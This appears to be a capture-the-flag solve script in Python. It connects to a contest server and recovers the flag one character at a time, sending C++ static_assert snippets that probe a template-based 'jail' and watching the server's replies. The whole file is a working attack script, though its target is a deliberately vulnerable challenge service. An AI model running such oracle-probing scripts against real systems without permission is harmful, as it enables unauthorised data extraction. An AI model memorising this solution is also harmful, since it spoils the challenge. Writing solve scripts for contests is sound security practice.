from socket import AF_INET, SOCK_STREAM, socket
from string import printable, whitespace

IGNORE = "#* " + whitespace
CODE = "static_assert(sizeof(std::declval<Jail<void>::lock<'%s',%d>>().k.i)!=1);"

if __name__ == "__main__":
    flag = "bctf{"
    while not flag.endswith("}"):
        success = False
        for char in printable:
            if char in IGNORE:
                continue
            with socket(AF_INET, SOCK_STREAM) as conn:
                conn.connect(("gold.b01le.rs", 7003))

                def recv():
                    string = conn.recv(65536).decode("utf-8")
                    print(string)
                    return string

                def send(string: str):
                    print(string)
                    conn.send(f"{string}\n".encode())

                recv()
                send(CODE % (Rf"\{char}" if char in R"\'" else char, len(flag)))
                if "Prisoner 2" in recv():
                    flag += char
                    success = True
                    break
        if not success:
            flag += "*"
        print(flag)
